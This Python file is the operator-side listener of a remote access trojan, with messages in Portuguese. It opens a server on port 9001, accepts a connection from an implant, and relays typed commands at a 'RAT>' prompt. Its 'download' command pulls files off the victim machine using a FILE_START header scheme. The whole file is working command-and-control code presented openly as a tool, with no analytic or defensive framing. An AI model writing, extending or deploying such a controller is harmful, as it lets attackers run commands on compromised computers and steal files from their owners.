import socket

PORT = 9001

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind(("0.0.0.0", PORT))
server.listen(1)
print(f"[*] Aguardando conexão na porta {PORT}...")

conn, addr = server.accept()
print(f"[*] Conexão estabelecida com {addr}")

banner = conn.recv(4096).decode(errors="ignore")
print(banner.strip())

while True:
    try:
        command = input("RAT> ")
        if not command.strip():
            continue

        conn.send((command + "\n").encode())

        if command.lower().startswith("download"):
            header_bytes = bytearray()
            while not header_bytes.endswith(b"\n"):
                chunk = conn.recv(1)
                if not chunk:
                    break
                header_bytes.extend(chunk)
            
            header = header_bytes.decode(errors="ignore").strip()

            if header.startswith("FILE_START:"):
                _, filename, filesize = header.split(":")
                filesize = int(filesize)
                
                print(f"[*] Baixando '{filename}' ({filesize} bytes)...")
                
                received = 0
                with open(filename, "wb") as f:
                    while received < filesize:
                        to_read = min(filesize - received, 4096)
                        chunk = conn.recv(to_read)
                        if not chunk:
                            break
                        f.write(chunk)
                        received += len(chunk)
                        
                print(f"[+] Download concluído: {filename}")
            else:
                print(header)
        else:
            response = conn.recv(8192).decode(errors="ignore")
            print(response.strip())
            
    except KeyboardInterrupt:
        print("\n[*] Encerrando listener...")
        conn.close()
        break
    except Exception as e:
        print(f"[!] Erro de conexão: {e}")
        break
